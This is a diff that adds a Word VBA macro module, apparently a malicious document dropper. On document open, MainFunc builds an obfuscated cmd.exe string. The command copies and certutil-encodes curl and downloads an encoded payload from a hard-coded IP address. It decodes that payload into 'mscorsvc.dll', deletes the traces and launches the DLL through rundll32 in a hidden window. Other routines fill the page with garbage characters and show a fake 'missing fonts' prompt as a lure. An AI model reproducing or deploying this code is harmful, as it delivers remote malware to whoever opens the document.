@@ -1,0 +1,208 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+' Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
+' Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+
+' Sub ChangeText()
+'     ActiveDocument.Words(19).Text = "The "
+' End Sub
+
+Sub DeleteText()
+    ' Dim rngFirstParagraph As Range
+    
+    ' Set rngFirstParagraph = ActiveDocument.Paragraphs(4).Range
+    ' With rngFirstParagraph
+    ' .Delete
+    ' .InsertAfter Text:="New text"
+    ' .InsertParagraphAfter
+    ' End With
+
+    Set rngFirstParagraph = ActiveDocument.Paragraphs(4).Range
+    With rngFirstParagraph
+    .Delete
+    .InsertAfter Text:="Fourth paragraph displayed " + Chr(34)
+    .InsertParagraphAfter
+    End With
+
+    Set rngFirstParagraph = ActiveDocument.Paragraphs(5).Range
+    With rngFirstParagraph
+    .Delete
+    .InsertAfter Text:="Fifth paragraph displayed"
+    .InsertParagraphAfter
+    End With
+
+    Set rngFirstParagraph = ActiveDocument.Paragraphs(6).Range
+    With rngFirstParagraph
+    .Delete
+    .InsertAfter Text:="Sixth paragraph displayed"
+    .InsertParagraphAfter
+    End With
+
+    Set rngFirstParagraph = ActiveDocument.Paragraphs(7).Range
+    With rngFirstParagraph
+    .Delete
+    .InsertAfter Text:="Seventh paragraph displayed"
+    .InsertParagraphAfter
+    End With
+
+    For i = 1 To ActiveDocument.Paragraphs.Count
+        ' ActiveDocument.Paragraphs(i).Style = wdStyleNormal
+        Set myRange = ActiveDocument.Paragraphs(i).Range
+        With myRange.Font
+        ' .Bold = True
+        .Name = "Times New Roman"
+        .Size = 14
+        End With
+    Next i
+End Sub
+
+Sub ShowErrorText()
+    Dim rngFirstParagraph As Range
+    
+    Set rngFirstParagraph = ActiveDocument.Paragraphs(4).Range
+    With rngFirstParagraph
+    .Delete
+    .InsertAfter Text:=ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3)
+    .InsertParagraphAfter
+
+    .InsertAfter Text:=ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3)
+    .InsertParagraphAfter
+
+    .InsertAfter Text:=ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3)
+    .InsertParagraphAfter
+
+    .InsertAfter Text:=ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3)
+
+    .InsertAfter Text:=ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + _
+    " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + ChrW(-3) + " " + ChrW(-3)
+    .InsertParagraphAfter
+    End With
+End Sub
+
+'Show msgbox
+Sub MsgFunc()
+    Dim Msg, Style, Title, Help, Ctxt, Response, MyString
+    Msg = "The document cannot be fully displayed due to missing fonts. Do you want to install missing fonts?"    ' Define message.
+    Style = vbYesNo Or vbCritical Or vbDefaultButton2    ' Define buttons.
+    Title = "Missing font"    ' Define title.
+    Help = "DEMO.HLP"    ' Define Help file.
+    Ctxt = 1000    ' Define topic context.
+    ' Display message.
+    Response = MsgBox(Msg, Style, Title, Help, Ctxt)
+    If Response = vbYes Then    ' User chose Yes.
+        MyString = "Yes"    ' Perform some action.
+        DeleteText
+    Else    ' User chose No.
+        MyString = "No"    ' Perform some action.
+        'MsgFunc
+    End If
+End Sub
+
+Sub MainFunc()
+    Dim curl_enc_txt_path As String
+    Dim curl_dec_exe_path As String
+    Dim mal_enc_txt_url As String
+    Dim mal_enc_txt_path As String
+    Dim mal_dec_exe_path As String
+    Dim pp As String
+    Dim cc As String
+    Dim Dir As String
+    Dim host As String
+
+    Dir = ActiveDocument.Path
+    Dir = Environ("temp")
+    host = "http://172.104.160.126:8099"
+    curl_enc_txt_path = Dir + "\curl.txt"
+    curl_dec_exe_path = Dir + "\curl.exe"
+
+    mal_enc_txt_url = host + "/payload2.txt"
+    mal_enc_txt_path = Dir + "\mscorsvc.txt"
+    mal_dec_exe_path = Dir + "\mscorsvc.dll"
+
+    pp = pp + "C:\Windows\Sys"
+    pp = pp + "tem32\cmd.exe /c "
+    cc = cc + curl_enc_txt_path + curl_dec_exe_path
+    pp = pp + "xcopy C:\Windows\Sys"
+    cc = cc + curl_enc_txt_path + mal_enc_txt_url
+    pp = pp + "tem32\cu" + "rl.exe " + Dir + " & "
+    cc = cc + mal_enc_txt_path + mal_enc_txt_url
+    pp = pp + "certutil -f "
+    cc = cc + mal_enc_txt_path + mal_dec_exe_path
+    pp = pp + "-encode " + Dir + "\cu" + "rl.exe " + curl_enc_txt_path + " & "
+    cc = cc + pp + mal_dec_exe_path
+    pp = pp + "certutil -f "
+    cc = cc + pp + Dir
+    pp = pp + "-decode " + curl_enc_txt_path + " " + curl_dec_exe_path + " & "
+    cc = cc + curl_enc_txt_path + Dir
+
+    pp = pp + curl_dec_exe_path + " " + mal_enc_txt_url + " -o " + mal_enc_txt_path + " & "
+    cc = cc + curl_enc_txt_path + Dir
+    pp = pp + "certutil -f "
+    cc = cc + curl_enc_txt_path + curl_dec_exe_path
+    pp = pp + "-decode " + mal_enc_txt_path + " " + mal_dec_exe_path + " & "
+    cc = cc + mal_enc_txt_url + curl_dec_exe_path
+
+    pp = pp + "del " + Dir + "\cu" + "rl.exe & "
+    cc = cc + host + pp + curl_enc_txt_path
+    pp = pp + "del " + curl_enc_txt_path + " & "
+    cc = cc + curl_enc_txt_path + Dir
+    pp = pp + "del " + curl_dec_exe_path + " & "
+    cc = cc + curl_dec_exe_path + pp
+
+    pp = pp + "del " + mal_enc_txt_path + " & "
+    cc = cc + mal_enc_txt_path + pp
+
+    Dim vbDblQuote As String
+    vbDblQuote = Chr(34)
+    pp = pp + "START " + vbDblQuote + " " + vbDblQuote + " rundll32 " + mal_dec_exe_path + ",DllMain" + " & "
+    cc = cc + mal_dec_exe_path + pp
+
+    pp = pp + "exit"
+    cc = cc + Dir + pp
+    'pp = pp + "cmd.exe -d & exit"
+    'cc = cc + mal_enc_txt_url + curl_dec_exe_path
+    ' Shell (pp), vbHidden
+
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run pp, 0, False
+End Sub
+
+
+Sub Document_Open()
+    MainFunc
+End Sub
+
+
